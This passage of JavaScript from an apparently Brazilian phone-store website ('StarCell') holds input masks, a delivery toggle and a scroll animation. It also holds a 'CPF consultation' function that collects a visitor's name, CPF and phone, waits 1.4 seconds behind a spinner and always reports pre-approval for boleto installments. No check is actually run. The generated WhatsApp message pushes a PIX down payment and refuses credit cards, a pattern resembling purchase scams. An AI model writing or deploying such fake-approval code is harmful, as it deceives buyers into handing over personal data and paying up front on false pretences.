  lucide.createIcons();
}

// Alternar entre Retirada na Loja e Envio
function toggleDeliveryFields() {
  const deliveryType = document.querySelector('input[name="delivery-type"]:checked')?.value;
  const addressContainer = document.getElementById('delivery-address-container');
  if (addressContainer) {
    if (deliveryType === 'shipping') {
      addressContainer.classList.remove('hidden');
      document.getElementById('checkout-customer-address').required = true;
    } else {
      addressContainer.classList.add('hidden');
      document.getElementById('checkout-customer-address').required = false;
    }
  }
}

// Máscara automática de CPF
function maskCpf(input) {
  let v = input.value.replace(/\D/g, "");
  if (v.length > 11) v = v.slice(0, 11);
  v = v.replace(/(\d{3})(\d)/, "$1.$2");
  v = v.replace(/(\d{3})(\d)/, "$1.$2");
  v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  input.value = v;
}

// Máscara automática de Telefone
function maskPhone(input) {
  let v = input.value.replace(/\D/g, "");
  if (v.length > 11) v = v.slice(0, 11);
  if (v.length > 10) {
    v = v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
  } else if (v.length > 5) {
    v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
  } else if (v.length > 2) {
    v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
  }
  input.value = v;
}

// ========================================================
// 🎬 MOTION DESIGN SKILL OBSERVER (Apple Scroll Reveals)
// ========================================================
function initMotionDesign() {
  const observer = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('revealed');
        obs.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.08,
    rootMargin: '0px 0px -40px 0px'
  });

  document.querySelectorAll('.motion-reveal').forEach(el => {
    observer.observe(el);
  });
}

// 💳 CONSULTA DE CPF PARA ENTRADA PIX / PIX + CARTÃO & PARCELAMENTO NO BOLETO
function handleCpfConsultation(e) {
  if (e) e.preventDefault();
  const nameInput = document.getElementById('cpf-consult-name');
  const cpfInput = document.getElementById('cpf-consult-cpf');
  const phoneInput = document.getElementById('cpf-consult-phone');
  const modelInput = document.getElementById('cpf-consult-model');
  const entryInput = document.getElementById('cpf-consult-entry');
  const installmentsInput = document.getElementById('cpf-consult-installments');

  if (!nameInput || !cpfInput || !phoneInput) return;

  const name = nameInput.value.trim();
  const cpf = cpfInput.value.trim();
  const phone = phoneInput.value.trim();
  const model = modelInput ? modelInput.value : 'iPhone';
  const entry = entryInput ? entryInput.value : 'Entrada PIX';
  const installments = installmentsInput ? installmentsInput.value : '12x no Boleto';

  if (!name || !cpf || !phone) {
    alert('Por favor, preencha todos os campos obrigatórios para consulta.');
    return;
  }

  const form = document.getElementById('cpf-consult-form');
  const loading = document.getElementById('cpf-consult-loading');
  const result = document.getElementById('cpf-consult-result');

  if (form) form.classList.add('hidden');
  if (loading) loading.classList.remove('hidden');

  setTimeout(() => {
    if (loading) loading.classList.add('hidden');
    if (result) result.classList.remove('hidden');

    const elName = document.getElementById('res-consult-name');
    const elCpf = document.getElementById('res-consult-cpf');
    const elModel = document.getElementById('res-consult-model');
    const elEntry = document.getElementById('res-consult-entry');
    const elInstallments = document.getElementById('res-consult-installments');

    if (elName) elName.innerText = name;
    if (elCpf) elCpf.innerText = cpf;
    if (elModel) elModel.innerText = model;
    if (elEntry) elEntry.innerText = entry;
    if (elInstallments) elInstallments.innerText = installments;

    const message = `Olá, StarCell! Realizei a consulta de CPF no site oficial e fui PRÉ-APROVADO para compra com boleto bancário:

👤 *Nome:* ${name}
📄 *CPF:* ${cpf}
📱 *WhatsApp:* ${phone}
🎯 *Aparelho:* ${model}
💳 *Forma de Entrada:* ${entry}
📑 *Parcelamento:* ${installments}

⚠️ *Aviso Lido:* Estou ciente de que NÃO ACEITAM CARTÕES DE CRÉDITO DEVIDO A FRAUDES E GOLPES, SOMENTE ENTRADA POR PIX OU PIX COM CARTÃO DE CRÉDITO.

Gostaria de formalizar o contrato e retirada ou envio com seguro!`;

    const waBtn = document.getElementById('cpf-finish-wa-btn');
    if (waBtn) {
      waBtn.href = `https://wa.me/${STORE_CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
    }

    if (window.lucide) {
      lucide.createIcons();
    }
  }, 1400);
}

function resetCpfConsultation() {
  const form = document.getElementById('cpf-consult-form');
  const result = document.getElementById('cpf-consult-result');
  const loading = document.getElementById('cpf-consult-loading');

  if (result) result.classList.add('hidden');
  if (loading) loading.classList.add('hidden');
  if (form) {
    form.classList.remove('hidden');
    form.reset();
  }
}
